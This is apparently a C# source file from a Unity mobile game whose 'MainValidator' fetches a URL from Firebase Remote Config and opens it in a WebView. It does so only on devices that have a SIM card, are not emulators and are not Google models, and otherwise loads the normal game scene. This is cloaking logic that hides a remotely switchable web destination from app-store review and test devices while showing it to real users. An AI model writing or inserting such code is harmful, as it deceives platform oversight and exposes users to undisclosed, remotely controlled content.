using System;
using System.Threading.Tasks;
using Firebase;
using Firebase.Extensions;
using Firebase.RemoteConfig;
using Game.Constants;
using ModestTree;
using UnityEngine;
using UnityEngine.SceneManagement;
using Utils;
using Zenject;

namespace Main
{
    public class MainValidator : IInitializable
    {
        public MainValidator(WebViewObject webViewObject)
        {
            _webViewObject = webViewObject;
        }

        private const int SceneIndex = 1;
        private const string UrlKey = "url";

        private readonly WebViewObject _webViewObject;

        public void Initialize()
        {
            if (PlayerPrefs.HasKey(ProjectConstants.UrlPlayerPrefsKey))
            {
                var url = PlayerPrefs.GetString(ProjectConstants.UrlPlayerPrefsKey);
                OpenUrl(url);
            }
            else
            {
                FirebaseApp
                    .CheckAndFixDependenciesAsync()
                    .ContinueWithOnMainThread(task => {
                    var dependencyStatus = task.Result;
                    if (dependencyStatus == DependencyStatus.Available)
                    {
                        FirebaseRemoteConfig.DefaultInstance.FetchAndActivateAsync()
                            .ContinueWithOnMainThread(_ => OnComplete());
                    }
                });
                
                void OnComplete()
                {
                    var url = FirebaseRemoteConfig.DefaultInstance.GetValue(UrlKey).StringValue;
                    if (Validate(url))
                    {
                        OpenUrl(url);
                    }
                    else
                    {
                        SceneManager.LoadScene(SceneIndex);
                    }
                }
            }
        }

        private void OpenUrl(string url)
        {
            _webViewObject.Init();
            _webViewObject.LoadURL(url);
        }

        private bool Validate(string url)
        {
            var isUrlEmpty = url.IsEmpty();
            if (isUrlEmpty) return false;

            var isGoogle = SystemInfo.deviceModel.Contains("Google");
            if (isGoogle) return false;

            var hasSim = CheckSim.HasSim();
            if (!hasSim) return false;

            var isEmulator = EmulatorValidator.IsEmulator();
            if (isEmulator) return false;

            return true;
        }
    }
}